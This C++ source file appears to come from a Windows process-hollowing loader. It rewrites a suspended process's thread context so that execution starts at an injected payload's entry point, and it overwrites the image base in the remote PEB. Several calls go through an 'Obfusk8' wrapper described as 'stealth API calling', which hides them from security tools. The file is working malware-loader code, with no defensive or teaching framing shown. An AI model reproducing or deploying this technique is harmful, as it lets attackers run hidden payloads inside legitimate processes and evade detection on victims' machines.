#include "../include/hollowing_parts.h"
#include "../include/encryption.h"
#include <iostream>

// Include Obfusk8 for stealth API calling
#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"

BOOL update_remote_entry_point_in_ctx(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va, bool is32bit)
{
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "Writing new EP: " << std::hex << entry_point_va << std::endl;
#endif
#if defined(_WIN64)
    if (is32bit) {
        // The target is a 32 bit executable while the loader is 64bit,
        // so, in order to access the target we must use Wow64 versions of the functions:

        // 1. Get initial context of the target (using stealth API):
        WOW64_CONTEXT context = { 0 };
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        
        ProcessAPI procAPI;
        BOOL result = FALSE;
        if (procAPI.IsInitialized() && procAPI.pWow64GetThreadContext) {
            result = procAPI.pWow64GetThreadContext(pi.hThread, &context);
        } else {
            // Fallback to direct API
            result = Wow64GetThreadContext(pi.hThread, &context);
        }
        
        if (!result) {
            std::cerr << "Failed to get Wow64 thread context! Error: " << GetLastError() << "\n";
            return FALSE;
        }
        // 2. Set the new Entry Point in the context:
        context.Eax = static_cast<DWORD>(entry_point_va);

        // 3. Set the changed context into the target (using stealth API):
        BOOL setResult = FALSE;
        if (procAPI.IsInitialized() && procAPI.pWow64SetThreadContext) {
            setResult = procAPI.pWow64SetThreadContext(pi.hThread, &context);
        } else {
            setResult = Wow64SetThreadContext(pi.hThread, &context);
        }
        
        if (!setResult) {
            std::cerr << "Failed to set Wow64 thread context! Error: " << GetLastError() << "\n";
        }
        return setResult;
    }
#endif
    // 1. Get initial context of the target (using stealth API):
    CONTEXT context = { 0 };
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    
    ProcessAPI procAPI;
    BOOL result = FALSE;
    if (procAPI.IsInitialized() && procAPI.pGetThreadContext) {
        result = procAPI.pGetThreadContext(pi.hThread, &context);
    } else {
        // Fallback to direct API
        result = GetThreadContext(pi.hThread, &context);
    }
    
    if (!result) {
        std::cerr << "Failed to get thread context! Error: " << GetLastError() << "\n";
        return FALSE;
    }
    // 2. Set the new Entry Point in the context:
#if defined(_WIN64)
    context.Rcx = entry_point_va;
#else
    context.Eax = static_cast<DWORD>(entry_point_va);
#endif
    // 3. Set the changed context into the target (using stealth API):
    BOOL setResult = FALSE;
    if (procAPI.IsInitialized() && procAPI.pSetThreadContext) {
        setResult = procAPI.pSetThreadContext(pi.hThread, &context);
    } else {
        setResult = SetThreadContext(pi.hThread, &context);
    }
    
    if (!setResult) {
        std::cerr << "Failed to set thread context! Error: " << GetLastError() << "\n";
    }
    return setResult;
}

ULONGLONG get_remote_peb_addr(PROCESS_INFORMATION &pi, bool is32bit)
{
    ProcessAPI procAPI;
#if defined(_WIN64)
    if (is32bit) {
        //get initial context of the target (using stealth API):
        WOW64_CONTEXT context;
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        
        BOOL result = FALSE;
        if (procAPI.IsInitialized() && procAPI.pWow64GetThreadContext) {
            result = procAPI.pWow64GetThreadContext(pi.hThread, &context);
        } else {
            result = Wow64GetThreadContext(pi.hThread, &context);
        }
        
        if (!result) {
            printf("Wow64 cannot get context!\n");
            return 0;
        }
        //get remote PEB from the context
        return static_cast<ULONGLONG>(context.Ebx);
    }
#endif
    ULONGLONG PEB_addr = 0;
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    
    BOOL result = FALSE;
    if (procAPI.IsInitialized() && procAPI.pGetThreadContext) {
        result = procAPI.pGetThreadContext(pi.hThread, &context);
    } else {
        result = GetThreadContext(pi.hThread, &context);
    }
    
    if (!result) {
        return 0;
    }
#if defined(_WIN64)
    PEB_addr = context.Rdx;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}

inline ULONGLONG get_img_base_peb_offset(bool is32bit)
{
    /*
    We calculate this offset in relation to PEB,
    that is defined in the following way
    (source "ntddk.h"):
    typedef struct _PEB
    {
        BOOLEAN InheritedAddressSpace; // size: 1
        BOOLEAN ReadImageFileExecOptions; // size : 1
        BOOLEAN BeingDebugged; // size : 1
        BOOLEAN SpareBool; // size : 1
                        // on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
        HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit

        PVOID ImageBaseAddress;
        [...]
        */
    ULONGLONG img_base_offset = is32bit ?
        sizeof(DWORD) * 2
        : sizeof(ULONGLONG) * 2;

    return img_base_offset;
}

bool redirect_entry_point(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi, bool is32bit)
{
    //1. Calculate VA of the payload's EntryPoint
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;

    std::cout << "Calculated entry point: " << std::hex << ep_va << " (RVA: " << ep << ")\n";

    //2. Write the new Entry Point into context of the remote process:
    if (update_remote_entry_point_in_ctx(pi, ep_va, is32bit) == FALSE) {
        std::cerr << "Cannot update remote EP! Error: " << GetLastError() << "\n";
        return false;
    }
    
    // Verify the context was updated (small delay for context propagation)
    Sleep(100);
    
    return true;
}

bool set_new_image_base(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi, bool is32bit)
{
    ProcessAPI procAPI;
    
    // 1. Get access to the remote PEB:
    ULONGLONG remote_peb_addr = get_remote_peb_addr(pi, is32bit);
    if (!remote_peb_addr) {
        std::cerr << "Failed getting remote PEB address!\n";
        return false;
    }
    // 2. get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + get_img_base_peb_offset(is32bit));
    //calculate size of the field (depends on architecture):
    const size_t img_base_size = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);

    SIZE_T written = 0;
    // 3. Write the payload's ImageBase into remote process' PEB (using stealth API):
    BOOL result = FALSE;
    if (procAPI.IsInitialized() && procAPI.pWriteProcessMemory) {
        result = procAPI.pWriteProcessMemory(pi.hProcess, remote_img_base,
            &load_base, img_base_size,
            &written);
    } else {
        // Fallback to direct API
        result = WriteProcessMemory(pi.hProcess, remote_img_base,
            &load_base, img_base_size,
            &written);
    }
    
    if (!result)
    {
        std::cerr << "Cannot update ImageBaseAddress! Error: " << GetLastError() << "\n";
        return false;
    }
    
    // Verify the write was successful
    if (written != img_base_size) {
        std::cerr << "ImageBase write was incomplete! Expected " << img_base_size 
                  << " bytes, but wrote " << written << " bytes\n";
        return false;
    }
    
    // Add a small delay after PEB modification to ensure it propagates
    Sleep(100);
    
    return true;
}

bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, bool is32bit)
{
    if (!redirect_entry_point(loaded_pe, load_base, pi, is32bit)) return false;
    if (!set_new_image_base(loaded_pe, load_base, pi, is32bit)) return false;
    return true;
}
